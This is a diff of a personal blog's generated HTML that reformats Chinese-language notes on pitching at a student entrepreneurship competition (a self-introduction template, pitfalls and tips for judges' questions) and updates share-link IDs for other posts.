 <p>我是来自 <strong>_</strong>（项目团队或者公司的xx职位）的<strong>_</strong>，我的项目是<strong>_</strong>（不超过20个字），旨在为<strong>_</strong>（用户或客户）提供<strong>_</strong>（差异化的产品或服务），解决<strong>_</strong>（市场需求以及痛点），实现<strong>_</strong>价值。经过前期调研，已进入<strong>_</strong>（测试、试运行、运营等当下项目状态，是否工商注册），已经拥有可以支持解决方案的核心技术和资源有<strong>_</strong>和<strong>_</strong>（用事实、数据说话），极端性的成果有<strong>_</strong>（现金收入、积累的用户、产品成熟度、服务以及市场占有率）等<br>财务方面（本项目需要多少启动资金或者前期已投入的资金，资金是如何筹措的？是否有营业收入或预测未来6个月的现金收入，何时能达到盈亏平衡以及盈利；如果需要融资<strong>_</strong>万元，拟出让股权<strong>_</strong>%，该笔资金主要用于<strong>_</strong>（市场推广、产品技术升级、人员、采购设备、生产、研发、流动资金等）方面</p>
 </blockquote>
 <hr>
-<h2 id="项目路演的六忌"><a href="#项目路演的六忌" class="headerlink" title="项目路演的六忌"></a>项目路演的六忌</h2><blockquote>
-<ul>
-<li>忌诵读PPT</li>
-<li>忌平淡少激情</li>
-<li>忌眼神不交流</li>
-<li>忌不练就上台</li>
-<li>忌答非所问</li>
+<h2 id="项目路演的六忌"><a href="#项目路演的六忌" class="headerlink" title="项目路演的六忌"></a>项目路演的六忌</h2><ul>
+<li><p>忌诵读PPT</p>
+</li>
+<li><p>忌平淡少激情</p>
+</li>
+<li><p>忌眼神不交流</p>
+</li>
+<li><p>忌不练就上台</p>
+</li>
+<li><p>忌答非所问</p>
+</li>
 </ul>
-</blockquote>
 <hr>
-<h2 id="路演九字决及三重境界"><a href="#路演九字决及三重境界" class="headerlink" title="路演九字决及三重境界"></a>路演九字决及三重境界</h2><blockquote>
-<ul>
-<li>说人话</li>
-<li>将数字</li>
-<li>谈梦想</li>
-<li>令人明白（言简意赅，逻辑慎密）</li>
-<li>令人相信（有理有据摆事实）</li>
-<li>令人激动（激情梦想和奋斗）</li>
+<h2 id="路演九字决及三重境界"><a href="#路演九字决及三重境界" class="headerlink" title="路演九字决及三重境界"></a>路演九字决及三重境界</h2><ul>
+<li><p>说人话</p>
+</li>
+<li><p>将数字</p>
+</li>
+<li><p>谈梦想</p>
+</li>
+<li><p>令人明白（言简意赅，逻辑慎密）</p>
+</li>
+<li><p>令人相信（有理有据摆事实）</p>
+</li>
+<li><p>令人激动（激情梦想和奋斗）</p>
+</li>
 </ul>
-</blockquote>
 <hr>
-<h2 id="现场答辩的常见几个问题"><a href="#现场答辩的常见几个问题" class="headerlink" title="现场答辩的常见几个问题"></a>现场答辩的常见几个问题</h2><blockquote>
-<ul>
-<li>谁有什么问题需要你解决</li>
-<li>你怎样解决？好在哪里</li>
-<li>为什么只有你能解决</li>
-<li>谁和你一起干？如何分工</li>
-<li>现在干得咋样啦</li>
-<li>未来怎样发展？还需要多少钱？</li>
+<h2 id="现场答辩的常见几个问题"><a href="#现场答辩的常见几个问题" class="headerlink" title="现场答辩的常见几个问题"></a>现场答辩的常见几个问题</h2><ul>
+<li><p>谁有什么问题需要你解决</p>
+</li>
+<li><p>你怎样解决？好在哪里</p>
+</li>
+<li><p>为什么只有你能解决</p>
+</li>
+<li><p>谁和你一起干？如何分工</p>
+</li>
+<li><p>现在干得咋样啦</p>
+</li>
+<li><p>未来怎样发展？还需要多少钱？</p>
+</li>
 </ul>
-</blockquote>
-<hr>
-<h2 id="评委提问和答辩要点"><a href="#评委提问和答辩要点" class="headerlink" title="评委提问和答辩要点"></a>评委提问和答辩要点</h2><blockquote>
-<ul>
-<li>仔细聆听评委的问题和用意</li>
-<li>直接回答问题，不要回避</li>
-<li>不理解的问题要先确认</li>
-<li>不懂就承认，承诺弄清楚</li>
-<li>让最了解的人回答，其他人补充</li>
-<li>简明扼要，注意语速语调</li>
+<h2 id="评委提问和答辩要点"><a href="#评委提问和答辩要点" class="headerlink" title="评委提问和答辩要点"></a>评委提问和答辩要点</h2><ul>
+<li><p>仔细聆听评委的问题和用意</p>
+</li>
+<li><p>直接回答问题，不要回避</p>
+</li>
+<li><p>不理解的问题要先确认</p>
+</li>
+<li><p>不懂就承认，承诺弄清楚</p>
+</li>
+<li><p>让最了解的人回答，其他人补充</p>
+</li>
+<li><p>简明扼要，注意语速语调</p>
+</li>
 </ul>
-</blockquote>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/12/01/%E4%BA%92%E8%81%94%E7%BD%91+%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%88%9B%E6%96%B0%E5%88%9B%E4%B8%9A%E5%A4%A7%E8%B5%9B%E5%9F%B9%E8%AE%AD%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/" data-id="ck6rtuwr9000cjosv8l6k9mor" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/12/01/%E4%BA%92%E8%81%94%E7%BD%91+%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%88%9B%E6%96%B0%E5%88%9B%E4%B8%9A%E5%A4%A7%E8%B5%9B%E5%9F%B9%E8%AE%AD%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/" data-id="ck6rvaorq000btcsv44004n62" class="article-share-link">Share</a>
       
       
     </footer>
@@ -664,7 +679,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/11/26/Kali(xfce)%20linux%20%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%E7%9A%84%E6%96%B9%E6%B3%95/" data-id="ck6rtuwr40009josv7v7qg07z" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/11/26/Kali(xfce)%20linux%20%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%E7%9A%84%E6%96%B9%E6%B3%95/" data-id="ck6rvaosf000ctcsv76r3du9s" class="article-share-link">Share</a>
       
       
     </footer>
@@ -735,7 +750,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/11/26/%E5%A6%82%E4%BD%95%E5%B0%86py%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85%E6%88%90exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/" data-id="ck6rtuwrf000fjosv9lqdfx3e" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/11/26/%E5%A6%82%E4%BD%95%E5%B0%86py%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85%E6%88%90exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/" data-id="ck6rvaosk000gtcsv6mud5811" class="article-share-link">Share</a>
       
       
     </footer>
@@ -831,7 +846,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/11/26/%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" data-id="ck6rtuwrd000ejosvcsnufg9o" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/11/26/%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" data-id="ck6rvaosh000etcsv20ah6ynw" class="article-share-link">Share</a>
       
       
     </footer>
